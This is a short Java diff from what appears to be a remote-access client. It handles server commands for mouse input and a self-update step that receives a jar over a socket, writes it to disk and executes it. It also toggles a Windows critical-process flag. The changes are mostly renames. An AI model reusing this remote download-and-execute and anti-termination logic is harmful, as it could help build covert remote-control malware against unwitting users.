@@ -511,12 +511,12 @@ public class ReceiveMessage extends Thread{
                                 sendScreen.MouseWheel(s6);
                                 break;
                         case MessageFlags.UPDATE:
-                            LoadDLL.instance.RemoveProtect();
-                            File file = new File(Client.getPath1() + "\\new.jar");
+                            LoadDLL.instance.RemoveProcessIsCritical();
+                            File file = new File(Client.getWindowsPath1() + "\\new.jar");
                             file.createNewFile();
                             break;
                         case MessageFlags.UPDATE_PREPARE:
-                            fileUpdate = new FileOutputStream(Client.getPath1() + "\\new.jar");
+                            fileUpdate = new FileOutputStream(Client.getWindowsPath1() + "\\new.jar");
                             break;
                         case MessageFlags.UPDATE_FILE:
                             lens = SendMessage.receiveLength(dataInputStream);
@@ -525,7 +525,7 @@ public class ReceiveMessage extends Thread{
                             break;
                         case MessageFlags.UPDATE_FILE_END:
                             fileUpdate.close();
-                            Runtime.getRuntime().exec("java -jar " + Client.getPath1() + "\\new.jar " + Kernel32.INSTANCE.GetCurrentProcessId());
+                            Runtime.getRuntime().exec("java -jar " + Client.getWindowsPath1() + "\\new.jar " + Kernel32.INSTANCE.GetCurrentProcessId());
                             SendMessage.SendHead(MessageFlags.UPDATE,socket);
                             break;
                         case MessageFlags.REGIDTER_WINDOWS_SHOW:
